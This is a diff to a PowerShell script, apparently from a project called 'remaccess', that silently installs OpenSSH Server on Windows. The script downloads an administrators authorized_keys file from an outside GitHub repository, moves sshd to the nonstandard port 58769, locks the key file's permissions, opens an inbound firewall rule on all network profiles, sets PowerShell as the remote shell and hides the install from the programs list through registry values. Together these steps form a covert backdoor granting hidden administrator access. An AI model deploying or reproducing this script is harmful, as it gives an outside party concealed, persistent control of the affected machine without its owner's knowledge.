@@ -1,3 +1,4 @@
+##Configureable variables.
 $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/OpenSSHServer64.msi"
 $authorizedkeyfile = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/administrators_authorized_keys"
 $sshdconfigfile = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/sshd_config"
@@ -20,12 +21,14 @@ $registryPathsToHide = @(
 )
 $RegValueName = "SystemComponent"
 $RegValueData = 1
+
 #Verbosity Function.
 function Write-VerboseMessage($message) {
     if ($VerboseOutput) {
         Write-Host $message
     }
 }
+
 #hash function.
 function Download-File {
     param (
@@ -67,14 +70,41 @@ foreach ($serviceName in $serviceNames) {
         sc.exe delete $serviceName | Out-Null
     }
 }
+
 #installation of ssh
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
 Download-File -downloadUrl $downloadUrl -destinationPath $destinationPath
 Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart" -Wait
+
+#Modifying port in sshd_config
+if (Test-Path $sshdconfigdestinationpath) {
+    $configContent = Get-Content $sshdconfigdestinationpath -Raw
+    if ($configContent -match 'Port 22') {
+        $newConfigContent = $configContent -replace '#Port 22', 'Port 58769'
+        Set-Content -Path $sshdconfigdestinationpath -Value $newConfigContent
+		Write-Host "Port 22 replaced with Port 58769 in $sshdconfigdestinationpath"
+    } else {
+        Write-Host "Port 22 not found in $sshdconfigdestinationpath"
+    }
+} else {
+    Write-Host "File $sshdconfigdestinationpath not found"
+}
+
+#Downloading config files
+#Download-File -downloadUrl $sshdconfigfile -destinationPath $sshdconfigdestinationpath
 Download-File -downloadUrl $authorizedkeyfile -destinationPath $authorizedkeyfiledestinationpath
-Download-File -downloadUrl $sshdconfigfile -destinationPath $sshdconfigdestinationpath
+
+#Fixing auth-key perm
+$acl = Get-Acl  "$authorizedkeyfiledestinationpath"
+$acl.SetAccessRuleProtection($true, $false)
+$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
+$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
+$acl.SetAccessRule($administratorsRule)
+$acl.SetAccessRule($systemRule)
+$acl | Set-Acl
+
 #Firewall rule cleanup, before setting new. should be cleanup section but the script requires modifcations so don't change its placement.
 $allRules = Get-NetFirewallRule
 foreach ($ruleDisplayName in $ruleDisplayNames) {
@@ -86,11 +116,13 @@ foreach ($ruleDisplayName in $ruleDisplayNames) {
         Write-VerboseMessage "Rule not found: $ruleDisplayName"
     }
 }
+
 #Continuing with install
 New-NetFirewallRule -Name $inprodrule -DisplayName $inprodrule -Action Allow -Enabled True -Direction Inbound -Program $ProgramPath -Profile @("Domain", "Private", "Public") | Out-Null
 Write-VerboseMessage "Setting default shell to powershell" -ForegroundColor Green
 New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
 Restart-Service sshd
+
 #Hidding form program list.
 foreach ($registryPath in $registryPathsToHide) {
     if (Test-Path $registryPath) {
